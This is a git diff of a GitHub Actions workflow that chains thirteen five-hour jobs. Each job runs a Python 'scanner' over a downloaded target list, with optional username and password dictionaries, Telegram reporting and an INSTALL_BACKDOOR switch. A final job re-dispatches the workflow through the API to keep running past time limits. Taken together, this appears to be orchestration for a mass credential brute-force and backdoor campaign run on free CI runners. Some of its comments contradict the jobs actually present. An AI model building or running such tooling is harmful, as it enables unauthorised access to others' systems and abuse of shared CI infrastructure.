@@ -43,36 +43,14 @@ on:
         default: 'scanner_progress.json'
 
 jobs:
-  # 定义一个包含所有扫描作业的数组，方便引用
-  setup:
+  # This is the first job in the chain
+  run-scan-1:
     runs-on: ubuntu-latest
-    outputs:
-      jobs: ${{ steps.generate_jobs.outputs.result }}
-    steps:
-      - id: generate_jobs
-        run: echo "result=$(jq -cn --argjson n 13 '[range(1; $n + 1) | "run-scan-\(.)"]')"
-
-  # 动态生成 13 个扫描作业
-  run-scan:
-    needs: setup
-    strategy:
-      matrix:
-        job_index: ${{ fromJson(needs.setup.outputs.jobs) }}
-    
-    # 确保作业按顺序执行
-    # Job 2 needs Job 1, Job 3 needs Job 2, etc.
-    needs: 
-      - setup
-      - ${{ format('run-scan-{0}', fromJson(needs.setup.outputs.jobs)[matrix.job_index-2]) }}
-
-    runs-on: ubuntu-latest
-    timeout-minutes: 300 # 每个作业5小时超时
+    timeout-minutes: 300 # 5-hour timeout for each job
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v3
-
-      # ... (Set up Go, Python, Install, Download steps are the same)
       - name: Set up Go
         uses: actions/setup-go@v4
         with: { go-version: '1.22' }
@@ -90,10 +68,441 @@ jobs:
         run: |
           if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
           if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
-
       - name: Run Python Worker Script
         env:
-          # Pass all secrets and inputs to the script
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  # Subsequent jobs are identical, but 'need' the previous one
+  run-scan-2:
+    needs: run-scan-1
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  # Repeat for jobs 3 through 12... (This is verbose but correct)
+  # To save space, I'll show job 3 and then skip to 13
+
+  run-scan-3:
+    needs: run-scan-2
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+  run-scan-4:
+    needs: run-scan-3
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  run-scan-5:
+    needs: run-scan-4
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  run-scan-6:
+    needs: run-scan-5
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  run-scan-7:
+    needs: run-scan-6
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+  run-scan-8:
+    needs: run-scan-7
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  run-scan-9:
+    needs: run-scan-8
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+  run-scan-10:
+    needs: run-scan-9
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+  run-scan-11:
+    needs: run-scan-10
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+  run-scan-12:
+    needs: run-scan-11
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
+          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
+          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
+          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
+          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
+        run: python main.py
+
+  # ... imagine jobs 4, 5, 6, 7, 8, 9, 10, 11, 12 are here ...
+
+  run-scan-13:
+    needs: run-scan-12 # This would need run-scan-12 in a full file
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.22' }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.10' }
+      - run: |
+          python -m pip install --upgrade pip
+          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+      - if: github.event.inputs.use_custom_dict == 'true'
+        run: |
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
+      - name: Run Python Worker Script
+        env:
           GIST_ID: ${{ secrets.GIST_ID }}
           GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
@@ -112,8 +521,7 @@ jobs:
 
   relay_or_finish:
     runs-on: ubuntu-latest
-    # 等待最后一个扫描作业完成
-    needs: run-scan-13
+    needs: run-scan-13 # This job runs only after the last scan job completes
 
     steps:
       - name: Download input file for final check
@@ -121,21 +529,21 @@ jobs:
 
       - name: Trigger Next Workflow (if needed)
         run: |
-          # 1. 从 Gist 获取最新的进度
+          # 1. From Gist, get the latest progress
           PROGRESS_CONTENT=$(curl -s -H "Authorization: token ${{ secrets.GIST_TOKEN }}" https://api.github.com/gists/${{ secrets.GIST_ID }} | jq -r '.files."${{ github.event.inputs.progress_file_name }}".content')
           
-          # 2. 计算总分片数和已完成分片数
+          # 2. Calculate total and completed parts
           TOTAL_LINES=$(wc -l < 1.txt)
           LINES_PER_PART=${{ github.event.inputs.lines_per_file }}
           TOTAL_PARTS=$(( (TOTAL_LINES + LINES_PER_PART - 1) / LINES_PER_PART ))
           COMPLETED_PARTS=$(echo "$PROGRESS_CONTENT" | jq '.completed_parts | length')
 
-          echo "总分片数: $TOTAL_PARTS"
-          echo "已完成分片: $COMPLETED_PARTS"
+          echo "Total parts: $TOTAL_PARTS"
+          echo "Completed parts: $COMPLETED_PARTS"
 
-          # 3. 如果未完成，则触发下一个工作流
+          # 3. If not finished, trigger the next workflow
           if [[ "$COMPLETED_PARTS" -lt "$TOTAL_PARTS" ]]; then
-            echo "任务未完成，本工作流生命周期结束，正在触发新的工作流..."
+            echo "Task not finished. Triggering a new workflow to continue..."
             
             INPUTS=$(jq -n \
               --arg tm "${{ github.event.inputs.template_mode }}" \
@@ -155,5 +563,5 @@ jobs:
               https://api.github.com/repos/${{ github.repository }}/actions/workflows/scanner.yml/dispatches \
               -d "$INPUTS"
           else
-            echo "🎉 所有任务已完成，无需触发新工作流。"
+            echo "🎉 All tasks are complete. No new workflow will be triggered."
           fi
